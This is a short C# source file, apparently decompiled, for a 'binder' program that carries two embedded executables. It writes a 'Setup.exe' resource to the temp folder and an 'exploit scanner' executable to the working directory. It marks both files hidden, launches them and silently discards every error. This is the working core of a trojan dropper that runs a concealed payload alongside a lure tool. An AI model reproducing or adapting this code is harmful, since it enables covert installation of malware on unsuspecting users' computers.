using Binder_31_07_2019.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;

namespace Binder_31_07_2019
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void main()
    {
      try
      {
        string str = Interaction.Environ("temp") + "Setup.exe";
        if (!File.Exists(str))
        {
          File.WriteAllBytes(str, Binder_31_07_2019.My.Resources.Resources.Setup);
          Process.Start(str);
        }
        if (File.Exists(str))
        {
          File.SetAttributes(str, FileAttributes.Hidden);
          Process.Start(str);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        string str = Directory.GetCurrentDirectory() + "\\~Gr3eNoX_Exploit_Scanner_V8_0.exe";
        Array exploitScannerV80 = (Array) Binder_31_07_2019.My.Resources.Resources.Gr3eNoX_Exploit_Scanner_V8_0;
        if (File.Exists(str))
          Process.Start(str);
        if (File.Exists(str))
          return;
        MyProject.Computer.FileSystem.WriteAllBytes(str, (byte[]) exploitScannerV80, true);
        File.SetAttributes(str, FileAttributes.Hidden);
        Process.Start(str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
